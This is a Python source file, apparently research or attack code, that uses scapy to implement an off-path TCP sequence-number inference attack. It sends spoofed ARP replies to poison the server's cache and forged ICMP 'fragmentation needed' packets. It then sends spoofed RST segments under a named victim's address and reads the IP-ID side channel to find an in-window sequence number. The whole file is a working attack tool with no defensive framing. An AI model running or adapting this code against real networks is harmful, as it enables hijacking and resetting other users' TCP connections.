# coding=utf-8

import struct
import threading
import time
from scapy.all import *
from scapy.layers.inet import *
from scapy.layers.l2 import *

TCP_INVALID_RATELIMIT = 0.5


class Task:
    def __init__(self, seq, count=0, l_time=0.0):
        self.seq = seq
        self.count = count
        self.l_time = l_time

    def __cmp__(self, other):
        return self.count < other.count

    def __eq__(self, other):
        return self.seq == other.seq

    def __hash__(self):
        return hash(self.seq)


class Seq_Finder:

    def __init__(self, forge_ip, server_port, client_port, server_mac, bind_ifname='ens33',
                 client_ip='10.10.100.1', server_ip='10.10.100.2', num_thread=5, block_size=80100,
                 chunk_size=150, check_num=3, verbose=False):
        self.forge_ip = forge_ip
        self.victim_ip = client_ip
        self.server_ip = server_ip
        self.server_port = server_port
        self.client_port = client_port

        self.server_mac_addr = server_mac
        self.bind_if_name = bind_ifname
        self.my_mac_addr = get_if_hwaddr(bind_ifname)

        self.__z_payload = b''
        for i in range(0, 520):
            self.__z_payload += struct.pack('B', 0)

        self.N_THREAD = num_thread
        self.BLOCK = block_size
        self.CHUNK = chunk_size
        self.MX = check_num
        self.__sleep_time = TCP_INVALID_RATELIMIT

        self.__semaphore_fin = threading.Semaphore(1)
        self.__semaphore_ipid = threading.Semaphore(1)
        self.__semaphore = threading.Semaphore(1)
        self.__task_list = []
        self.__start_point = 0
        self.__current_point = self.__start_point
        self.__end_point = (1 << 32) - 1
        self.__stop = False
        self.result = -1

        self.send_n = 0
        self.send_byte = 0
        self.cost_time = -1

        self.verbose = verbose

    def arp_inject(self):
        pkt = sniff(filter="arp " + "and dst " + self.forge_ip + " and ether src " + self.server_mac_addr,
                    iface=self.bind_if_name, timeout=0.5, count=1, started_callback=
                    lambda: send(IP(src=self.forge_ip, dst=self.server_ip) / UDP(dport=80),
                                 iface=self.bind_if_name, verbose=False))

        if len(pkt) == 1 and pkt[0][1].fields['psrc'] == self.server_ip and pkt[0][1].fields['pdst'] == self.forge_ip:
            send(ARP(pdst=self.server_ip, hwdst=self.server_mac_addr, psrc=self.forge_ip, hwsrc=self.my_mac_addr, op=2),
                 iface=self.bind_if_name, verbose=False)

        time.sleep(1)

        if not self.__stop:
            ts = threading.Thread(target=self.arp_inject)
            ts.start()

    def tcp_fragment(self):
        send(IP(src=self.forge_ip, dst=self.server_ip) /
             ICMP(type=3, code=4, nexthopmtu=68) /
             IP(flags=2, src=self.server_ip, dst=self.victim_ip) /
             ICMP(type=0, code=0) /
             self.__z_payload,
             iface=self.bind_if_name, verbose=False)

        time.sleep(1)

        if not self.__stop:
            tr = threading.Thread(target=self.tcp_fragment)
            tr.start()

    def check_new_list(self, list_p):
        C = len(list_p)
        L = 0
        icmp_seq = random.randint(0, (1 << 16) - 1)

        send_list = [IP(src=self.forge_ip, dst=self.server_ip) / ICMP(id=icmp_seq)]
        for sq in list_p:
            send_list.append(IP(src=self.victim_ip, dst=self.server_ip) /
                             TCP(sport=self.client_port, dport=self.server_port, seq=sq, flags='R'))
            send_list.append(IP(src=self.forge_ip, dst=self.server_ip) / ICMP(id=icmp_seq))

        for pkg in send_list:
            L += len(pkg)

        while True:
            self.__semaphore_ipid.acquire()
            self.send_n += len(send_list)
            self.send_byte += L
            pkts = sniff(filter="icmp and icmp[4:2]=" + str(icmp_seq) + " and dst " + self.forge_ip,
                         iface=self.bind_if_name, count=1 + C, timeout=1.5, started_callback=
                         lambda: send(send_list, iface=self.bind_if_name, verbose=False))
            self.__semaphore_ipid.release()
            if len(pkts) != 1 + C:
                time.sleep(self.__sleep_time)
            else:
                break

        ipids = []
        for pk in pkts:
            ipids.append(pk[1].fields['id'])

        list_next = []
        for i in range(1, C + 1):
            if ipids[i] - ipids[i - 1] >= 2:
                list_next.append(list_p[i - 1])

        return list_next

    def check_new_chunk(self):
        seq_set = set()
        seq_list = []
        self.__semaphore.acquire()
        task_set = set(self.__task_list)
        ls = list(task_set)
        time_now = time.time()
        for ti in ls:
            if time_now - ti.l_time > self.__sleep_time:
                task_set.remove(ti)
                seq_list.append(ti.seq)
                seq_set.add(ti)
                if len(seq_list) == self.BLOCK:
                    break

        self.__task_list = list(task_set)

        if len(seq_list) == self.BLOCK:
            check_list = seq_list
            self.__semaphore.release()
        else:
            chunk_start_p = self.__current_point
            self.__current_point += self.BLOCK * self.CHUNK
            self.__current_point = min(self.__end_point, self.__current_point)
            chunk_end_p = self.__current_point
            if self.__current_point == self.__end_point:
                self.__stop = True
            self.__semaphore.release()

            check_list = []
            ptr = chunk_start_p
            while ptr < chunk_end_p:
                check_list.append(ptr)
                ptr = min(ptr + self.BLOCK, chunk_end_p)

            check_list.extend(seq_list)
            if self.verbose:
                print('checking: ' + str((chunk_start_p, chunk_end_p)))

        list_next = self.check_new_list(check_list)
        time_now = time.time()

        if len(list_next) != 0:
            add_task_new = []
            add_task = set()
            add_set = []

            for p in list_next:
                if Task(p) in seq_set:
                    add_task.add(p)
                else:
                    add_task_new.append(p)

            for p in add_task_new:
                add_set.append(Task(p, 1, time_now))

            for ta in seq_set:
                if ta.seq in add_task:
                    if ta.count == self.MX - 1:
                        self.__semaphore.acquire()
                        self.result = ta.seq
                        self.__stop = True
                        self.__semaphore.release()
                        if self.verbose:
                            print('--Found in Window Seq: ' + str(self.result))
                        return

                    add_set.append(Task(ta.seq, ta.count + 1, time_now))

            self.__semaphore.acquire()
            self.__task_list.extend(add_set)
            self.__semaphore.release()

    def check_template(self):
        if self.__stop:
            if self.result == -1:
                while not self.__stop:
                    self.__semaphore_fin.acquire()
                    while len(self.__task_list) != 0:
                        self.check_new_chunk()
                        time.sleep(self.__sleep_time)
                    self.__semaphore_fin.release()
            else:
                if self.verbose:
                    print('Found In Window Seq: ' + str(self.result))

            return
        else:
            self.check_new_chunk()

        t = threading.Thread(target=self.check_template)
        t.start()

    def run(self):
        t_s = time.time()
        ts = threading.Thread(target=self.arp_inject)
        ts.start()

        tr = threading.Thread(target=self.tcp_fragment)
        tr.start()

        for i in range(0, self.N_THREAD):
            t = threading.Thread(target=self.check_template)
            t.start()
            if self.verbose:
                print('Num_' + str(i) + ' thread started.')
            time.sleep(0.1)

        while not self.__stop:
            time.sleep(1)

        t_e = time.time()
        self.cost_time = t_e - t_s

        print('------ In Window Seq Find ------:')
        print('Forged IP: ' + self.forge_ip)
        print('Target Server: ' + self.server_ip + ':' + str(self.server_port))
        print('Target Victim: ' + self.victim_ip + ':' + str(self.client_port))
        print('In Window Seq Number: ' + str(self.result))
        print('Send Packets: ' + str(self.send_n))
        print('Send Bytes: ' + str(self.send_byte) + ' (Bytes)')
        print('Cost Time: ' + str(t_e - t_s) + ' (s)')

        return t_e - t_s
